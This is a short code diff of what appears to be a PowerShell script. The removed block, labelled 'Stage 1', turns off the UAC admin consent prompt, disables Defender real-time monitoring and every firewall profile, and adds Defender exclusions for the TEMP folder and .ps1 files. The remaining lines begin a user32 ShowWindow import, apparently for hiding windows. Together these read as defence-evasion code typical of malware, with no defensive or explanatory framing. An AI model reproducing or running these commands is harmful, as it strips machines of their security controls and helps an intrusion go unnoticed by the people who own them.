@@ -1,13 +1,3 @@
-try {
-    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
-    Set-MpPreference -DisableRealtimeMonitoring $true
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-    Add-MpPreference -ExclusionPath "$env:TEMP"
-    Add-MpPreference -ExclusionExtension ".ps1"
-} catch {
-    Write-Warning "Administrative privileges required for Stage 1."
-}
-
 $ms = @'
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
